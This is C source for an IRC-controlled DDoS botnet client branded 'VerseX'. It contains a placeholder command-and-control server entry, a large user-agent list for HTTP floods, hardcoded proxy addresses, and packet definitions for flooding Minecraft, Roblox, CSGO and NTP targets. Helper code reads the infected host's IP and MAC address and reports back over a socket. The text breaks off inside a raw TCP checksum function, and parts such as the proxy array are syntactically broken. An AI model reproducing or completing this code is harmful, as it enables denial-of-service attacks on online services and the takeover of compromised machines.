////////////////////////////////
//       [ SSP ] VerseX       //
////////////////////////////////

////////////////////////////////
#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pthread.h>
#include <netinet/if_ether.h>
////////////////////////////////
#define SERVER_LIST_SIZE (sizeof(SSPserver) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define OPT_SGA   3
#define BUFFER_SIZE 512
#define BUF_SIZE 1024
#define BUFSIZE 1000
#define STD2_STRING "dts"
#define STD2_SIZE 50
#define std_packet 1460
#define PACKET_SIZE 1024

#define NTP_PACKET_SIZE 256
#define NTP_TIMEOUT_SEC 10

#define CSGO_IP_HDR_LEN 20
#define CSGO_PKT_LEN 64
#define CSGO_SRC_PORT 53485 // replace with desired source port
#define CSGO_SRC_IP "10.0.6.58" // replace with desired source ip
////////////////////////////////
// Minecraft packet structure
struct MinecraftPacket {
    // Packet length (including packet ID)
    int length;
    // Packet ID
    char id;
    // Packet data
    char data[PACKET_SIZE-2];
};

struct RobloxPacket {
    // Define the fields for your Roblox packet here
    int packetLength;
    char data[256];
};
////////////////////////////////
unsigned char *SSPserver[] = {"SERVER IP HERE:6667"};
////////////////////////////////
const char *useragents[] = {

	"wii libnup/1.0",

	"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",

	"PSP (PlayStation Portable); 2.00",

	"Bunjalloo/0.7.6(Nintendo DS;U;en)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 ",

        "Firefox/3.5.3",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 ",

        "Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) ",

        "Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) ",

        "Gecko/20090718 Firefox/3.5.1",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 ",

        "(KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; ",

        "SLCC2; .NET CLR 2.0.50727; InfoPath.2)",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; ",

        ".NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR ",

        "3.0.30729)",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; ",

        "Trident/4.0)",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; ",

        ".NET CLR 2.0.50727; InfoPath.2)",

        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",

        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",

        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",

        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) ",

        "Chrome/41.0.2228.0 Safari/537.36",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",

        "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 "

        "Version/12.16",

        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like ",

        "Gecko",

        "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) ",

        "like Gecko",

        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 ",

        "(KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",

        "Baiduspider+(+http://www.baidu.com/search/spider.htm)",

        "Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",

        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",

        "Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/",

        "BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",

        "zspider/0.9-dev http://feedback.redkolibri.com/",

        "Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",

        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",

        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",

        "Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",

        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",

        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",

        "Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",

        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",

        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",

        "Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",

        "TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",

        "TheSuBot/0.2 (www.thesubot.de)",

        "TheSuBot/0.1 (www.thesubot.de)",

        "FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",

        "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",

        "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",

        "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",

        "FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",

        "FAST-WebCrawler/3.x Multimedia",

        "Mozilla/4.0 (compatible: FDSE robot)",

        "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",

        "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",

        "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",

        "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",

        "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",

        "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",

        "Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",

        "Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",

        "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",

        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",

        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",

        "AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",

        "AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",

        "magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",

        "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",

        "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",

        "MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",

        "MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",

        "Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",

        "MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)",

        "Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0",

        "Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)",

        "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",

        "msnbot/0.9 (+http://search.msn.com/msnbot.htm)",

        "msnbot/0.11 ( http://search.msn.com/msnbot.htm)",

        "MSNBOT/0.1 (http://search.msn.com/msnbot.htm)",

        "Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)",

        "Mozilla/5.0 (compatible; mxbot/1.0;  http://www.chainn.com/mxbot.html)",

        "NetResearchServer/4.0(loopimprovements.com/robot.html)",

        "NetResearchServer/3.5(loopimprovements.com/robot.html)",

        "NetResearchServer/2.8(loopimprovements.com/robot.html)",

        "NetResearchServer/2.7(loopimprovements.com/robot.html)",

        "NetResearchServer/2.5(loopimprovements.com/robot.html)",

        "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)",

        "Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)",

        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",

        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",

        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET ",

        "Googlebot/2.1 (http://www.googlebot.com/bot.html)",

        "Opera/9.20 (Windows NT 6.0; U; en)",

        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",

        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)",

        "Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",

        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)",

        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",

        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)", 

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",

        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",

        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",

        "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",

        "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",

        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",

        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",

        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",

        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",

        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)",

        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",

        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",

        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0",
        
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36",

        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",

        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",

        "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53",

        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",

        "Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36",

        "Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36",

        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",

        "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393",

        "Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27",

        "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",

        "Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",

        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",

        "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",

        "Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",

        "Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",

        "Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",

        "Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",

        "Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15",

        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",

        "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",

        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",

        "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",

        "Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",

        "Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",

        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",

        "Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",

        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",

        "Mozilla/5.0 (PLAYSTATION 3; 3.55)",

        "Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",

        "Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5"
};
/////////////////////////////////////////
const char *proxies[] = {
        '137.110.161.153:80', 
        '142.93.6.218:80', 
        '198.211.102.65:80', 
        '82.66.49.123:80', 
        '150.253.243.239:80', 
        '134.122.92.134:80', 
        '81.169.187.194:80', 
        '195.93.200.140:80', 
        '190.210.186.241:80', 
        '221.132.18.38:80', 
        '83.142.126.147:80', 
        '207.178.166.187:80', 
        '212.26.225.114:80', 
        '210.4.194.196:80', 
        '114.29.212.145:80', 
        '202.150.1.87:80', 
        '65.49.34.13:80', 
        '84.241.25.151:80', 
        '67.63.33.7:80'
};
/////////////////////////////////////////
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int SSPsock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};
////////////////////////////////////////
void init_rand(uint32_t x)
{
        int i;

        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;

        for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
        uint64_t t, a = 18782LL;
        static uint32_t i = 4095;
        uint32_t x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (uint32_t)(t >> 32);
        x = t + c;
        if (x < c) {
                x++;
                c++;
        }
        return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
        int i;
        int begin = 0;
        int end = strlen(str) - 1;

        while (isspace(str[begin])) begin++;

        while ((end >= begin) && isspace(str[end])) end--;
        for (i = begin; i <= end; i++) str[i - begin] = str[i];

        str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
        if (str) {
                **str = c;
                ++(*str);
        }
        else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
        register int pc = 0, padchar = ' ';

        if (width > 0) {
                register int len = 0;
                register const unsigned char *ptr;
                for (ptr = string; *ptr; ++ptr) ++len;
                if (len >= width) width = 0;
                else width -= len;
                if (pad & PAD_ZERO) padchar = '0';
        }
        if (!(pad & PAD_RIGHT)) {
                for ( ; width > 0; --width) {
                        printchar (out, padchar);
                        ++pc;
                }
        }
        for ( ; *string ; ++string) {
                printchar (out, *string);
                ++pc;
        }
        for ( ; width > 0; --width) {
                printchar (out, padchar);
                ++pc;
        }

        return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
        unsigned char print_buf[PRINT_BUF_LEN];
        register unsigned char *s;
        register int t, neg = 0, pc = 0;
        register unsigned int u = i;

        if (i == 0) {
                print_buf[0] = '0';
                print_buf[1] = '\0';
                return prints (out, print_buf, width, pad);
        }

        if (sg && b == 10 && i < 0) {
                neg = 1;
                u = -i;
        }

        s = print_buf + PRINT_BUF_LEN-1;
        *s = '\0';

        while (u) {
                t = u % b;
                if( t >= 10 )
                t += letbase - '0' - 10;
                *--s = t + '0';
                u /= b;
        }

        if (neg) {
                if( width && (pad & PAD_ZERO) ) {
                        printchar (out, '-');
                        ++pc;
                        --width;
                }
                else {
                        *--s = '-';
                }
        }

        return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
        register int width, pad;
        register int pc = 0;
        unsigned char scr[2];

        for (; *format != 0; ++format) {
                if (*format == '%') {
                        ++format;
                        width = pad = 0;
                        if (*format == '\0') break;
                        if (*format == '%') goto out;
                        if (*format == '-') {
                                ++format;
                                pad = PAD_RIGHT;
                        }
                        while (*format == '0') {
                                ++format;
                                pad |= PAD_ZERO;
                        }
                        for ( ; *format >= '0' && *format <= '9'; ++format) {
                                width *= 10;
                                width += *format - '0';
                        }
                        if( *format == 's' ) {
                                register char *s = (char *)va_arg( args, int );
                                pc += prints (out, s?s:"(null)", width, pad); // this to
                                continue;
                        }
                        if( *format == 'd' ) {
                                pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'x' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'X' ) {
                                pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
                                continue;
                        }
                        if( *format == 'u' ) {
                                pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
                                continue;
                        }
                        if( *format == 'c' ) {
                                scr[0] = (unsigned char)va_arg( args, int );
                                scr[1] = '\0';
                                pc += prints (out, scr, width, pad);
                                continue;
                        }
                }
                else {
out:
                        printchar (out, *format);
                        ++pc;
                }
        }
        if (out) **out = '\0';
        va_end( args );
        return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
        unsigned char *textBuffer = malloc(2048);
        memset(textBuffer, 0, 2048);
        char *orig = textBuffer;
        va_list args;
        va_start(args, formatStr);
        print(&textBuffer, formatStr, args);
        va_end(args);
        orig[strlen(orig)] = '\n';
        int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
        free(orig);
        return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
        struct hostent *h;
        if((i->s_addr = inet_addr(toGet)) == -1) return 1;
        return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
        int i = 0;
        for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
        memset(buf, 0, bufsize);
        fd_set myset;
        struct timeval tv;
        tv.tv_sec = 30;
        tv.tv_usec = 0;
        FD_ZERO(&myset);
        FD_SET(socket, &myset);
        int selectRtn, retryCount;
        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                while(retryCount < 10)
                {
                        tv.tv_sec = 30;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(socket, &myset);
                        if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
                                retryCount++;
                                continue;
                        }
                        break;
                }
        }
        unsigned char tmpchr;
        unsigned char *cp;
        int count = 0;
        cp = buf;
        while(bufsize-- > 1)
        {
                if(recv(SSPsock, &tmpchr, 1, 0) != 1) {
                        *cp = 0x00;
                        return -1;
                }
                *cp++ = tmpchr;
                if(tmpchr == '\n') break;
                count++;
        }
        *cp = 0x00;
        return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
        struct sockaddr_in dest_addr;
        fd_set myset;
        struct timeval tv;
        socklen_t lon;

        int valopt;
        long arg = fcntl(fd, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(fd, F_SETFL, arg);

        dest_addr.sin_family = AF_INET;
        dest_addr.sin_port = htons(port);
        if(getHost(host, &dest_addr.sin_addr)) return 0;
        memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
        int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if (res < 0) {
                if (errno == EINPROGRESS) {
                        tv.tv_sec = timeout;
                        tv.tv_usec = 0;
                        FD_ZERO(&myset);
                        FD_SET(fd, &myset);
                        if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
                                lon = sizeof(int);
                                getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                                if (valopt) return 0;
                        }
                        else return 0;
                }
                else return 0;
        }

        arg = fcntl(fd, F_GETFL, NULL);
        arg &= (~O_NONBLOCK);
        fcntl(fd, F_SETFL, arg);

        return 1;
}
int listFork()
{
        uint32_t parent, *newpids, i;
        parent = fork();
        if (parent <= 0) return parent;
        numpids++;
        newpids = (uint32_t*)malloc((numpids + 1) * 4);
        for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
        newpids[numpids - 1] = parent;
        free(pids);
        pids = newpids;
        return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
        register uint64_t sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

        struct tcp_pseudo
        {
                unsigned long src_addr;
                unsigned long dst_addr;
                unsigned char zero;
                unsigned char proto;
                unsigned short length;
        } pseudohead;
        unsigned short total_len = iph->tot_len;
        pseudohead.src_addr=iph->saddr;
        pseudohead.dst_addr=iph->daddr;
        pseudohead.zero=0;
        pseudohead.proto=IPPROTO_TCP;
        pseudohead.length=htons(sizeof(struct tcphdr));
        int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
        unsigned short *tcp = malloc(totaltcp_len);
